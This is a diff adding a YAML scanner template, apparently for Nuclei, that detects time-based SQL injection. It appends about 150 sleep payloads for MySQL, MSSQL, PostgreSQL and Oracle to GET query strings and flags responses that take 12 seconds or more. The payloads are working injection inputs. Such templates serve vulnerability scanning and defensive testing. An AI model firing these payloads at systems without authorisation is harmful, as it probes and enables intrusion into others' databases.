@@ -1,0 +1,212 @@
+id: sqli-time-based-get
+
+info:
+  name: Time Based SQL Injection
+  author: serhatcck
+  severity: critical
+  description: Time Based SQLi 
+  tags: sqli, dast
+
+ 
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+    path: 
+     - "{BaseURL}"
+   
+    payloads:
+      injection:
+      #mysql
+       - " SELECT SLEEP(12)"
+       - " or (SELECT SLEEP(12)) = 123"
+       - "' or (SELECT SLEEP(12)) = '123"
+       - "\" or (SELECT SLEEP(12)) = \"123"
+       - ") (SELECT SLEEP(12))"
+       - ") or (SELECT SLEEP(12)) = 123"
+       - "') or (SELECT SLEEP(12)) = '123"
+       - "\") or (SELECT SLEEP(12)) = \"123"
+       - ")) (SELECT SLEEP(12))"
+       - ")) or (SELECT SLEEP(12)) = 123"
+       - "')) or (SELECT SLEEP(12)) = '123 "
+       - "\")) or (SELECT SLEEP(12)) = \"123"
+ 
+       - " and (SELECT SLEEP(12)) = 123"
+       - "' and (SELECT SLEEP(12)) = '123"
+       - "\" and (SELECT SLEEP(12)) = \"123"
+       - ") and (SELECT SLEEP(12)) = 123"
+       - "') and (SELECT SLEEP(12)) = '123"
+       - "\") and (SELECT SLEEP(12)) = \"123"
+       - ")) and (SELECT SLEEP(12)) = 123"
+       - "')) and (SELECT SLEEP(12)) = '123 "
+       - "\")) and (SELECT SLEEP(12)) = \"123"
+ 
+       - " || SELECT SLEEP(12) -- -"
+       - "' || (SELECT SLEEP(12)) -- -"
+       - "\" || (SELECT SLEEP(12)) -- -"
+       - ") || (SELECT SLEEP(12)) -- -"
+       - "') || (SELECT SLEEP(12)) -- -"
+       - "\") || (SELECT SLEEP(12)) -- -"
+       - ")) || (SELECT SLEEP(12)) -- -"
+       - "')) || (SELECT SLEEP(12)) -- -"
+       - "\")) || (SELECT SLEEP(12)) -- -"
+ 
+       - "; SELECT SLEEP(12); -- -"
+       - "'; SELECT SLEEP(12); -- -"
+       - "\"; SELECT SLEEP(12); -- -"
+       - "); SELECT SLEEP(12); -- -"
+       - "'); SELECT SLEEP(12); -- -"
+       - "\"); SELECT SLEEP(12); -- -"
+       - ")); SELECT SLEEP(12); -- -"
+       - "')); SELECT SLEEP(12); -- -"
+       - "\")); SELECT SLEEP(12); -- -"
+
+
+
+      #mssql 
+       - " WAITFOR DELAY '00:00:12'"
+       - " or (WAITFOR DELAY '00:00:12') = 123"
+       - "' or (WAITFOR DELAY '00:00:12') = '123"
+       - "\" or (WAITFOR DELAY '00:00:12') = \"123"
+       - ") (WAITFOR DELAY '00:00:12')"
+       - ") or (WAITFOR DELAY '00:00:12') = 123"
+       - "') or (WAITFOR DELAY '00:00:12') = '123"
+       - "\") or (WAITFOR DELAY '00:00:12') = \"123"
+       - ")) (WAITFOR DELAY '00:00:12')"
+       - ")) or (WAITFOR DELAY '00:00:12') = 123"
+       - "')) or (WAITFOR DELAY '00:00:12') = '123 "
+       - "\")) or (WAITFOR DELAY '00:00:12') = \"123"
+       
+       - " and (WAITFOR DELAY '00:00:12') = 123"
+       - "' and (WAITFOR DELAY '00:00:12') = '123"
+       - "\" and (WAITFOR DELAY '00:00:12') = \"123"
+       - ") and (WAITFOR DELAY '00:00:12') = 123"
+       - "') and (WAITFOR DELAY '00:00:12') = '123"
+       - "\") and (WAITFOR DELAY '00:00:12') = \"123"
+       - ")) and (WAITFOR DELAY '00:00:12') = 123"
+       - "')) and (WAITFOR DELAY '00:00:12') = '123 "
+       - "\")) and (WAITFOR DELAY '00:00:12') = \"123"
+       
+       - " || WAITFOR DELAY '00:00:12' -- -"
+       - "' || (WAITFOR DELAY '00:00:12') -- -"
+       - "\" || (WAITFOR DELAY '00:00:12') -- -"
+       - ") || (WAITFOR DELAY '00:00:12') -- -"
+       - "') || (WAITFOR DELAY '00:00:12') -- -"
+       - "\") || (WAITFOR DELAY '00:00:12') -- -"
+       - ")) || (WAITFOR DELAY '00:00:12') -- -"
+       - "')) || (WAITFOR DELAY '00:00:12') -- -"
+       - "\")) || (WAITFOR DELAY '00:00:12') -- -"
+       
+       - "; WAITFOR DELAY '00:00:12'; -- -"
+       - "'; WAITFOR DELAY '00:00:12'; -- -"
+       - "\"; WAITFOR DELAY '00:00:12'; -- -"
+       - "); WAITFOR DELAY '00:00:12'; -- -"
+       - "'); WAITFOR DELAY '00:00:12'; -- -"
+       - "\"); WAITFOR DELAY '00:00:12'; -- -"
+       - ")); WAITFOR DELAY '00:00:12'; -- -"
+       - "')); WAITFOR DELAY '00:00:12'; -- -"
+       - "\")); WAITFOR DELAY '00:00:12'; -- -"
+       
+       #postgresql
+       - " pg_sleep(12)"
+       - " or (pg_sleep(12)) = 123"
+       - "' or (pg_sleep(12)) = '123"
+       - "\" or (pg_sleep(12)) = \"123"
+       - ") (pg_sleep(12))"
+       - ") or (pg_sleep(12)) = 123"
+       - "') or (pg_sleep(12)) = '123"
+       - "\") or (pg_sleep(12)) = \"123"
+       - ")) (pg_sleep(12))"
+       - ")) or (pg_sleep(12)) = 123"
+       - "')) or (pg_sleep(12)) = '123 "
+       - "\")) or (pg_sleep(12)) = \"123"
+       
+       - " and (pg_sleep(12)) = 123"
+       - "' and (pg_sleep(12)) = '123"
+       - "\" and (pg_sleep(12)) = \"123"
+       - ") and (pg_sleep(12)) = 123"
+       - "') and (pg_sleep(12)) = '123"
+       - "\") and (pg_sleep(12)) = \"123"
+       - ")) and (pg_sleep(12)) = 123"
+       - "')) and (pg_sleep(12)) = '123 "
+       - "\")) and (pg_sleep(12)) = \"123"
+       
+       - " || pg_sleep(12) -- -"
+       - "' || (pg_sleep(12)) -- -"
+       - "\" || (pg_sleep(12)) -- -"
+       - ") || (pg_sleep(12)) -- -"
+       - "') || (pg_sleep(12)) -- -"
+       - "\") || (pg_sleep(12)) -- -"
+       - ")) || (pg_sleep(12)) -- -"
+       - "')) || (pg_sleep(12)) -- -"
+       - "\")) || (pg_sleep(12)) -- -"
+       
+       - "; pg_sleep(12); -- -"
+       - "'; pg_sleep(12); -- -"
+       - "\"; pg_sleep(12); -- -"
+       - "); pg_sleep(12); -- -"
+       - "'); pg_sleep(12); -- -"
+       - "\"); pg_sleep(12); -- -"
+       - ")); pg_sleep(12); -- -"
+       - "')); pg_sleep(12); -- -"
+       - "\")); pg_sleep(12); -- -"
+       #oracle
+       - " dbms_pipe.receive_message(('a'),12)"
+       - " or (dbms_pipe.receive_message(('a'),12)) = 123"
+       - "' or (dbms_pipe.receive_message(('a'),12)) = '123"
+       - "\" or (dbms_pipe.receive_message(('a'),12)) = \"123"
+       - ") (dbms_pipe.receive_message(('a'),12))"
+       - ") or (dbms_pipe.receive_message(('a'),12)) = 123"
+       - "') or (dbms_pipe.receive_message(('a'),12)) = '123"
+       - "\") or (dbms_pipe.receive_message(('a'),12)) = \"123"
+       - ")) (dbms_pipe.receive_message(('a'),12))"
+       - ")) or (dbms_pipe.receive_message(('a'),12)) = 123"
+       - "')) or (dbms_pipe.receive_message(('a'),12)) = '123 "
+       - "\")) or (dbms_pipe.receive_message(('a'),12)) = \"123"
+       
+       - " and (dbms_pipe.receive_message(('a'),12)) = 123"
+       - "' and (dbms_pipe.receive_message(('a'),12)) = '123"
+       - "\" and (dbms_pipe.receive_message(('a'),12)) = \"123"
+       - ") and (dbms_pipe.receive_message(('a'),12)) = 123"
+       - "') and (dbms_pipe.receive_message(('a'),12)) = '123"
+       - "\") and (dbms_pipe.receive_message(('a'),12)) = \"123"
+       - ")) and (dbms_pipe.receive_message(('a'),12)) = 123"
+       - "')) and (dbms_pipe.receive_message(('a'),12)) = '123 "
+       - "\")) and (dbms_pipe.receive_message(('a'),12)) = \"123"
+       
+       - " || dbms_pipe.receive_message(('a'),12) -- -"
+       - "' || (dbms_pipe.receive_message(('a'),12)) -- -"
+       - "\" || (dbms_pipe.receive_message(('a'),12)) -- -"
+       - ") || (dbms_pipe.receive_message(('a'),12)) -- -"
+       - "') || (dbms_pipe.receive_message(('a'),12)) -- -"
+       - "\") || (dbms_pipe.receive_message(('a'),12)) -- -"
+       - ")) || (dbms_pipe.receive_message(('a'),12)) -- -"
+       - "')) || (dbms_pipe.receive_message(('a'),12)) -- -"
+       - "\")) || (dbms_pipe.receive_message(('a'),12)) -- -"
+       
+       - "; dbms_pipe.receive_message(('a'),12); -- -"
+       - "'; dbms_pipe.receive_message(('a'),12); -- -"
+       - "\"; dbms_pipe.receive_message(('a'),12); -- -"
+       - "); dbms_pipe.receive_message(('a'),12); -- -"
+       - "'); dbms_pipe.receive_message(('a'),12); -- -"
+       - "\"); dbms_pipe.receive_message(('a'),12); -- -"
+       - ")); dbms_pipe.receive_message(('a'),12); -- -"
+       - "')); dbms_pipe.receive_message(('a'),12); -- -"
+       - "\")); dbms_pipe.receive_message(('a'),12); -- -"
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl : 
+           - 'duration >= 12'
+    extractors:
+      - type: dsl
+        dsl: 
+          - 'duration'
